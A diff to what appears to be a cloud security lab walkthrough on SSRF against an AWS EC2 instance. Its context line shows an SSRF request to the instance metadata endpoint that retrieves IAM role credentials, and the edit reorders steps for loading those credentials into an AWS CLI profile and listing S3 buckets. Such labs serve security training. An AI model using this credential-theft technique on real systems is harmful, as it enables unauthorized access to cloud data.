@@ -1172,7 +1172,7 @@ http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/securi
 * Add the **ec2-role** Credentials to the AWS profile.
 
 ```bash
-aws s3 ls --profile ec2-role
+aws configure --profile ec2-role
 ```
 
 <p align="center">
@@ -1186,6 +1186,10 @@ aws s3 ls --profile ec2-role
 </p>
 
 * List the **S3 bucket** using the configured ec2-role user profile.
+
+```bash
+aws s3 ls --profile ec2-role
+```
 
 <p align="center">
   <img src="/images/cloud/ec2_bucket_ssrf.png">
